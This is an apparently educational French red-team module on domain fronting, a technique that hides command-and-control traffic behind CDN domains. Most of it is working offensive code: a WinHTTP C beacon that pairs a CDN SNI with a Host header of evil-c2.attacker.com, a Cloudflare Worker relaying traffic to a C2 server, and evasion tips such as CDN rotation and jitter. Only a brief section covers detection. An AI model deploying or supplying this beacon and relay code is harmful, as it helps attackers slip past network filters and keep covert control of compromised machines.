# Domain Fronting - Masquer le C2 via CDN

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- [ ] Comprendre le principe du domain fronting
- [ ] Implémenter domain fronting avec WinHTTP/WinInet
- [ ] Utiliser les CDN pour masquer le trafic C2
- [ ] Contourner les filtres réseau en Red Team

## Prérequis

Avant de commencer ce module, assurez-vous de maîtriser :
- Les bases du protocole HTTPS et TLS
- Module W46 (HTTPS Communication)
- Concepts de SNI (Server Name Indication) et headers HTTP

## Introduction

Le domain fronting est une technique qui exploite les CDN (CloudFlare, Azure, AWS) pour masquer la vraie destination du trafic C2. Le firewall voit une connexion légitime vers un CDN approuvé, mais le trafic est en réalité routé vers le serveur C2.

### Pourquoi ce sujet est important ?

**Analogie** : Imaginez envoyer un colis via Amazon. Sur le paquet, l'adresse dit "Amazon Warehouse", donc le contrôle postal l'autorise. Mais à l'intérieur du paquet, il y a une note avec la vraie adresse de livraison (votre C2).

**Problème résolu** : Les firewalls bloquent `evil-c2.com` mais autorisent `cdn.cloudflare.com`. Le domain fronting permet de contourner ce blocage.

## Concepts fondamentaux

### Concept 1 : SNI vs Host Header

```
Connexion HTTPS normale:
┌─────────┐    SNI: google.com          ┌──────────┐
│  Agent  │──────────────────────────>│ Firewall │
└─────────┘    Host: google.com         └──────────┘

Domain Fronting:
┌─────────┐    SNI: cdn.cloudflare.com  ┌──────────┐ (autorise)
│  Agent  │──────────────────────────>│ Firewall │
└─────────┘    Host: evil-c2.com        └──────────┘
                     ↑                        │
                     │                        v
                (chiffré TLS)           ┌──────────┐
                                        │   CDN    │ (route selon Host)
                                        └────┬─────┘
                                             │
                                             v
                                        ┌──────────┐
                                        │  C2 Real │
                                        └──────────┘
```

**Explication** :
- **SNI** : Nom de domaine envoyé en clair pendant le handshake TLS → vu par le firewall
- **Host Header** : Header HTTP à l'intérieur du tunnel TLS chiffré → vu par le CDN, pas le firewall
- Le firewall voit SNI=CDN légitime et autorise
- Le CDN route selon Host Header vers le vrai C2

### Concept 2 : Fonctionnement CDN

Les CDN (Content Delivery Networks) routent le trafic selon le Host header :

```
Client → CDN Edge Server → Origin Server
         (lit Host header)  (votre C2)
```

**Configuration C2** :
1. Hébergez C2 sur un serveur public
2. Configurez le CDN pour pointer vers votre C2
3. Agent utilise SNI=CDN, Host=votre-domaine-c2

### Concept 3 : Implémentation WinHTTP

```c
// SNI    : WinHttpConnect(domain)
// Host   : WinHttpAddRequestHeaders("Host: ...")

HINTERNET hConnect = WinHttpConnect(
    hSession,
    L"cdn.cloudflare.com",  // SNI (vu firewall)
    INTERNET_DEFAULT_HTTPS_PORT, 0
);

LPCWSTR headers = L"Host: evil-c2.attacker.com\r\n";  // Vraie destination
WinHttpAddRequestHeaders(hRequest, headers, -1, FLAGS);
```

## Mise en pratique

### Étape 1 : Domain Fronting avec WinHTTP

```c
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#pragma comment(lib, "winhttp.lib")

BOOL DomainFrontingBeacon(const char* cdn, const char* realHost, const char* uri) {
    // Convertir en wchar_t
    wchar_t wCdn[256], wUri[256];
    MultiByteToWideChar(CP_ACP, 0, cdn, -1, wCdn, 256);
    MultiByteToWideChar(CP_ACP, 0, uri, -1, wUri, 256);

    // 1. Session
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        NULL, NULL, 0
    );
    if (!hSession) return FALSE;

    // 2. Connect (SNI = CDN)
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        wCdn,  // SNI visible par firewall
        INTERNET_DEFAULT_HTTPS_PORT,
        0
    );
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // 3. Request
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        wUri,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // 4. Host Header (vraie destination)
    wchar_t hostHeader[512];
    swprintf(hostHeader, 512, L"Host: %S\r\n", realHost);

    WinHttpAddRequestHeaders(hRequest, hostHeader, -1,
        WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    // 5. Envoyer
    BOOL result = FALSE;
    if (WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            char buffer[4096];
            DWORD bytesRead;

            while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
                if (bytesRead == 0) break;
                buffer[bytesRead] = '\0';
                printf("%s", buffer);
            }
            result = TRUE;
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return result;
}

int main() {
    // Firewall voit: connexion HTTPS vers cdn.cloudflare.com (autorisé)
    // CDN route vers: evil-c2.attacker.com (Host header)

    if (DomainFrontingBeacon("cdn.cloudflare.com", "evil-c2.attacker.com", "/beacon")) {
        printf("[+] Domain fronting successful\n");
    } else {
        printf("[-] Failed: %d\n", GetLastError());
    }

    return 0;
}
```

### Étape 2 : Configuration CDN (exemple CloudFlare Worker)

```javascript
// CloudFlare Worker pour router le trafic
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)

  // Router vers le C2 réel
  const targetUrl = `https://real-c2-server.com${url.pathname}`

  return fetch(targetUrl, {
    method: request.method,
    headers: request.headers,
    body: request.body
  })
}
```

### Étape 3 : CDN Supportés (2025)

| CDN | Support DF | Notes |
|-----|------------|-------|
| **CloudFlare** | Limité | Workers peuvent router, mais détectable |
| **Azure CDN** | Oui | Custom domains, bonne OPSEC |
| **AWS CloudFront** | Ancien | Bloqué depuis 2018 |
| **Fastly** | Non | Politique stricte |

**Alternative moderne** : Malleable C2 profiles (Cobalt Strike) avec Host rotation.

## Application offensive

### Contexte Red Team

**Scénario** : Firewall bloque tous les domaines sauf whiteliste (Office365, CDN populaires).

**Solution Domain Fronting** :
```
1. Configure Azure CDN avec custom domain
2. Agent se connecte à cdn.azure.com (SNI)
3. Host header pointe vers ton domaine custom
4. Azure CDN route vers ton C2
5. Firewall ne voit que trafic Azure légitime
```

### Considérations OPSEC

```
[Avantages]
✓ Firewall voit SNI=CDN légitime → autorise
✓ DPI ne peut pas lire Host header (TLS chiffré)
✓ Contourne whitelist/blacklist par domaine
✓ Trafic se fond dans CDN légitime

[Inconvénients]
✗ CDN logs montrent Host header réel
✗ TLS 1.3+ peut exposer SNI vs Host mismatch
✗ Beaucoup de CDN ont bloqué cette technique
✗ Nécessite infrastructure CDN (coût)
```

**Détection** :
- SNI ≠ Host header (inspection TLS fingerprinting)
- Volume/patterns anormaux vers CDN
- CDN logs (si accès Blue Team)
- Certificat SSL mismatch

**Contre-mesures** :
```c
// 1. Rotation de CDN
const char* cdns[] = {
    "cdn.cloudflare.com",
    "cdn.azure.microsoft.com",
    "cdn.jsdelivr.net"
};

// 2. Jitter + throttling
Sleep(60000 + (rand() % 30000));  // Varier intervalle

// 3. Utiliser domaines custom légitimes
// Ex: votre-entreprise.azureedge.net
```

## Résumé

- **Domain Fronting** : SNI (CDN légitime) ≠ Host header (C2 réel)
- **WinHTTP** : `WinHttpConnect(cdn)` + `WinHttpAddRequestHeaders("Host: c2")`
- **CDN** : CloudFlare, Azure supportent (avec limitations)
- **OPSEC** : Firewall voit SNI=CDN, autorise trafic
- **Détection** : CDN logs, TLS fingerprinting, volume anomalies
- **Red Team** : Contourne whitelist, mais support CDN limité post-2018

## Ressources complémentaires

- [Domain Fronting - MITRE ATT&CK T1090.004](https://attack.mitre.org/techniques/T1090/004/)
- [CloudFlare Blocks Domain Fronting](https://blog.cloudflare.com/cloudflare-blocks-domain-fronting/)
- [Azure CDN Domain Fronting](https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/)

---

**Navigation**
- [Module précédent](../05-DNS-Communication/)
- [Module suivant](../07-Proxy-Awareness/)
